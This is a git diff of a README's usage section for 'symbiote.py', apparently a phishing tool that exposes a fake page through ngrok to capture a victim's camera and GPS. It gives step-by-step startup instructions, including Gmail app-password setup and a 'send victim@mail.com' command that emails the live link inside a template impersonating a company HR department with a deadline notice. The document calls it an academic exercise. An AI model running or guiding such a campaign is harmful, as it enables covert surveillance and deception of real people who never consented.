@@ -67,14 +67,42 @@ sudo apt install python3 php-cli -y
 
 ## USAGE
 
+### Full startup sequence
+
 ```
-1) python3 symbiote.py   # Enter = consent / camera / port 1516
-                         # then: Gmail + app password (ENTER = skip)
+1) python3 symbiote.py
+      # Consent prompt    -> ENTER = agree (controlled environments only)
+      # Camera selection  -> ENTER = "Veridia" (www_f) | 2 = original back page
+      # Local port        -> ENTER = 1516, or type any port (1-65535)
+      # Email setup       -> sender Gmail + app password (ENTER twice = skip)
 2) ngrok http 1516       # in another terminal (or beforehand)
-3) ENTER in the monitor  # public URL appears (auto-detected via local API 4040)
-   send victim@mail.com  # emails the verification link (Gmail SMTP)
-4) X to exit
+3) Monitor prompt <Symbiote>:
+      ENTER               -> refresh captures + re-check the ngrok URL
+      send victim@mail.com -> emails the verification link (Gmail SMTP)
+      X                   -> stop the server and exit
 ```
+
+The public URL is auto-detected from ngrok's local API (port 4040). If ngrok
+is not running, the tool shows the local URL and you start the tunnel
+manually; the public URL is picked up automatically on the next ENTER.
+
+### Email notifications (`send` command)
+
+1. Create an **app password** for the sender Gmail:
+   https://myaccount.google.com/apppasswords (requires 2-Step Verification
+   enabled) -> copy the 16-character key. Regular Gmail passwords always fail.
+2. At startup, enter the sender Gmail and the app password (input is hidden;
+   credentials are kept in memory only, never written to disk). Press ENTER
+   twice to skip — the tool works normally, only `send` stays disabled.
+3. From the monitor prompt: `send victim@mail.com`
+   - The link injected into the template is the **live ngrok URL** detected
+     at that moment (never stale).
+   - If ngrok is down, the email still goes out but the tool warns that the
+     LOCAL link will be carried.
+   - SMTP errors are printed in red without crashing; the monitor keeps
+     running.
+4. Template: `Server/email_template.html` ("Veridia Solutions · Talento
+   Humano", deadline notice, contact footer).
 
 **Important:**
 
@@ -82,8 +110,6 @@ sudo apt install python3 php-cli -y
 - The tool **does not manage ngrok**: it only detects its public URL.
 - Camera access requires HTTPS (the tunnel) or localhost.
 - GPS is only read if the victim already granted permission for the domain.
-- Gmail SMTP needs an **app password** (16 chars, myaccount.google.com/apppasswords);
-  regular passwords always fail.
 - The template footer states the email is part of an academic exercise in a
   controlled environment.
 
